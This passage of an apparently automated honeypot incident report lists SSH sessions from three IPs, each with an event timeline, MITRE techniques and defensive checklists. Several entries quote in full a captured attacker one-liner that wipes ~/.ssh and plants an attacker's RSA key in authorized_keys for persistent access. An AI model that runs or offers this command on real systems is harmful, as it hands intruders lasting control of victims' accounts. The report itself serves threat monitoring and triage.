| `2026-06-04 07:25:08` | `cowrie.command.failed` |
| `2026-06-04 07:25:08` | `cowrie.log.closed` |
| `2026-06-04 07:25:09` | `cowrie.session.params` |
| `2026-06-04 07:25:09` | `cowrie.command.input` |
| `2026-06-04 07:25:09` | `cowrie.session.file_download` |
| `2026-06-04 07:25:09` | `cowrie.log.closed` |
| `2026-06-04 07:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab6bca4dfc06

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:25 |
| **Last Seen** | 2026-06-04 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:25:11` | `cowrie.session.connect` |
| `2026-06-04 07:25:11` | `cowrie.client.version` |
| `2026-06-04 07:25:11` | `cowrie.client.kex` |
| `2026-06-04 07:25:11` | `cowrie.login.success` |
| `2026-06-04 07:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b12aa6ecb90

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 07:26 |
| **Last Seen** | 2026-06-04 07:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:26:09` | `cowrie.session.connect` |
| `2026-06-04 07:26:09` | `cowrie.client.version` |
| `2026-06-04 07:26:09` | `cowrie.client.kex` |
| `2026-06-04 07:26:09` | `cowrie.login.success` |
| `2026-06-04 07:26:10` | `cowrie.session.params` |
| `2026-06-04 07:26:10` | `cowrie.command.input` |
| `2026-06-04 07:26:10` | `cowrie.command.failed` |
| `2026-06-04 07:26:10` | `cowrie.log.closed` |
| `2026-06-04 07:26:10` | `cowrie.session.params` |
| `2026-06-04 07:26:10` | `cowrie.command.input` |
| `2026-06-04 07:26:10` | `cowrie.session.file_download` |
| `2026-06-04 07:26:10` | `cowrie.log.closed` |
| `2026-06-04 07:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39474933bf6

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 07:26 |
| **Last Seen** | 2026-06-04 07:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:26:12` | `cowrie.session.connect` |
| `2026-06-04 07:26:12` | `cowrie.client.version` |
| `2026-06-04 07:26:12` | `cowrie.client.kex` |
| `2026-06-04 07:26:12` | `cowrie.login.success` |
| `2026-06-04 07:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5ec654c22c

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:27 |
| **Last Seen** | 2026-06-04 07:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:27:11` | `cowrie.session.connect` |
| `2026-06-04 07:27:11` | `cowrie.client.version` |
| `2026-06-04 07:27:11` | `cowrie.client.kex` |
| `2026-06-04 07:27:12` | `cowrie.login.success` |
| `2026-06-04 07:27:12` | `cowrie.session.params` |
| `2026-06-04 07:27:12` | `cowrie.command.input` |
| `2026-06-04 07:27:12` | `cowrie.command.failed` |
| `2026-06-04 07:27:12` | `cowrie.log.closed` |
| `2026-06-04 07:27:12` | `cowrie.session.params` |
| `2026-06-04 07:27:12` | `cowrie.command.input` |
| `2026-06-04 07:27:13` | `cowrie.session.file_download` |
| `2026-06-04 07:27:13` | `cowrie.log.closed` |
| `2026-06-04 07:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef4d2b166a1

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:27 |
| **Last Seen** | 2026-06-04 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:27:15` | `cowrie.session.connect` |
| `2026-06-04 07:27:15` | `cowrie.client.version` |
| `2026-06-04 07:27:15` | `cowrie.client.kex` |
| `2026-06-04 07:27:15` | `cowrie.login.success` |
| `2026-06-04 07:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64295f597451

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:31 |
| **Last Seen** | 2026-06-04 07:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:31:30` | `cowrie.session.connect` |
| `2026-06-04 07:31:30` | `cowrie.client.version` |
| `2026-06-04 07:31:31` | `cowrie.client.kex` |
| `2026-06-04 07:31:31` | `cowrie.login.success` |
| `2026-06-04 07:31:31` | `cowrie.session.params` |
| `2026-06-04 07:31:31` | `cowrie.command.input` |
| `2026-06-04 07:31:31` | `cowrie.command.failed` |
| `2026-06-04 07:31:32` | `cowrie.log.closed` |
| `2026-06-04 07:31:32` | `cowrie.session.params` |
| `2026-06-04 07:31:32` | `cowrie.command.input` |
| `2026-06-04 07:31:32` | `cowrie.session.file_download` |
| `2026-06-04 07:31:32` | `cowrie.log.closed` |
| `2026-06-04 07:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa3b80fb072

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:31 |
| **Last Seen** | 2026-06-04 07:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:31:34` | `cowrie.session.connect` |
| `2026-06-04 07:31:34` | `cowrie.client.version` |
| `2026-06-04 07:31:34` | `cowrie.client.kex` |
| `2026-06-04 07:31:35` | `cowrie.login.success` |
| `2026-06-04 07:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c87d73bb80

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 07:35 |
| **Last Seen** | 2026-06-04 07:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:35:19` | `cowrie.session.connect` |
| `2026-06-04 07:35:19` | `cowrie.client.version` |
| `2026-06-04 07:35:19` | `cowrie.client.kex` |
| `2026-06-04 07:35:19` | `cowrie.login.success` |
| `2026-06-04 07:35:20` | `cowrie.session.params` |
| `2026-06-04 07:35:20` | `cowrie.command.input` |
| `2026-06-04 07:35:20` | `cowrie.command.failed` |
| `2026-06-04 07:35:20` | `cowrie.log.closed` |
| `2026-06-04 07:35:20` | `cowrie.session.params` |
| `2026-06-04 07:35:20` | `cowrie.command.input` |
| `2026-06-04 07:35:20` | `cowrie.session.file_download` |
| `2026-06-04 07:35:20` | `cowrie.log.closed` |
| `2026-06-04 07:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5237312398b

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 07:35 |
| **Last Seen** | 2026-06-04 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:35:21` | `cowrie.session.connect` |
| `2026-06-04 07:35:21` | `cowrie.client.version` |
| `2026-06-04 07:35:22` | `cowrie.client.kex` |
| `2026-06-04 07:35:22` | `cowrie.login.success` |
| `2026-06-04 07:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4594a08f5855

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:35 |
| **Last Seen** | 2026-06-04 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:35:28` | `cowrie.session.connect` |
| `2026-06-04 07:35:28` | `cowrie.client.version` |
| `2026-06-04 07:35:28` | `cowrie.client.kex` |
| `2026-06-04 07:35:28` | `cowrie.login.success` |
| `2026-06-04 07:35:29` | `cowrie.session.params` |
| `2026-06-04 07:35:29` | `cowrie.command.input` |
| `2026-06-04 07:35:29` | `cowrie.command.failed` |
| `2026-06-04 07:35:29` | `cowrie.log.closed` |
| `2026-06-04 07:35:29` | `cowrie.session.params` |
| `2026-06-04 07:35:29` | `cowrie.command.input` |
| `2026-06-04 07:35:29` | `cowrie.session.file_download` |
| `2026-06-04 07:35:29` | `cowrie.log.closed` |
| `2026-06-04 07:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4dead21101

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:35 |
| **Last Seen** | 2026-06-04 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:35:31` | `cowrie.session.connect` |
| `2026-06-04 07:35:31` | `cowrie.client.version` |
| `2026-06-04 07:35:31` | `cowrie.client.kex` |
| `2026-06-04 07:35:32` | `cowrie.login.success` |
| `2026-06-04 07:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f86d6fccbb9

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:36 |
| **Last Seen** | 2026-06-04 07:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:36:44` | `cowrie.session.connect` |
| `2026-06-04 07:36:44` | `cowrie.client.version` |
| `2026-06-04 07:36:44` | `cowrie.client.kex` |
| `2026-06-04 07:36:45` | `cowrie.login.success` |
| `2026-06-04 07:36:45` | `cowrie.session.params` |
| `2026-06-04 07:36:45` | `cowrie.command.input` |
| `2026-06-04 07:36:45` | `cowrie.command.failed` |
| `2026-06-04 07:36:45` | `cowrie.log.closed` |
| `2026-06-04 07:36:45` | `cowrie.session.params` |
| `2026-06-04 07:36:45` | `cowrie.command.input` |
| `2026-06-04 07:36:46` | `cowrie.session.file_download` |
| `2026-06-04 07:36:46` | `cowrie.log.closed` |
| `2026-06-04 07:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-785dd20dcf07

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:36 |
| **Last Seen** | 2026-06-04 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:36:48` | `cowrie.session.connect` |
| `2026-06-04 07:36:48` | `cowrie.client.version` |
| `2026-06-04 07:36:48` | `cowrie.client.kex` |
| `2026-06-04 07:36:48` | `cowrie.login.success` |
| `2026-06-04 07:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2b7799164e

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:37 |
| **Last Seen** | 2026-06-04 07:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:37:22` | `cowrie.session.connect` |
| `2026-06-04 07:37:22` | `cowrie.client.version` |
| `2026-06-04 07:37:23` | `cowrie.client.kex` |
| `2026-06-04 07:37:23` | `cowrie.login.success` |
| `2026-06-04 07:37:23` | `cowrie.session.params` |
| `2026-06-04 07:37:23` | `cowrie.command.input` |
| `2026-06-04 07:37:23` | `cowrie.command.failed` |
| `2026-06-04 07:37:24` | `cowrie.log.closed` |
| `2026-06-04 07:37:24` | `cowrie.session.params` |
| `2026-06-04 07:37:24` | `cowrie.command.input` |
| `2026-06-04 07:37:24` | `cowrie.session.file_download` |
| `2026-06-04 07:37:24` | `cowrie.log.closed` |
| `2026-06-04 07:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503b6419a0bc

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:37 |
| **Last Seen** | 2026-06-04 07:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:37:26` | `cowrie.session.connect` |
| `2026-06-04 07:37:26` | `cowrie.client.version` |
| `2026-06-04 07:37:26` | `cowrie.client.kex` |
| `2026-06-04 07:37:27` | `cowrie.login.success` |
| `2026-06-04 07:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61ba6dc5691

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:38 |
| **Last Seen** | 2026-06-04 07:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:38:43` | `cowrie.session.connect` |
| `2026-06-04 07:38:43` | `cowrie.client.version` |
| `2026-06-04 07:38:43` | `cowrie.client.kex` |
| `2026-06-04 07:38:43` | `cowrie.login.success` |
| `2026-06-04 07:38:43` | `cowrie.session.params` |
| `2026-06-04 07:38:43` | `cowrie.command.input` |
| `2026-06-04 07:38:43` | `cowrie.command.failed` |
| `2026-06-04 07:38:44` | `cowrie.log.closed` |
| `2026-06-04 07:38:44` | `cowrie.session.params` |
| `2026-06-04 07:38:44` | `cowrie.command.input` |
| `2026-06-04 07:38:44` | `cowrie.session.file_download` |
| `2026-06-04 07:38:44` | `cowrie.log.closed` |
| `2026-06-04 07:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffafeb5349e0

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:38 |
| **Last Seen** | 2026-06-04 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:38:46` | `cowrie.session.connect` |
| `2026-06-04 07:38:46` | `cowrie.client.version` |
| `2026-06-04 07:38:46` | `cowrie.client.kex` |
| `2026-06-04 07:38:47` | `cowrie.login.success` |
| `2026-06-04 07:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0246d7e92f7e

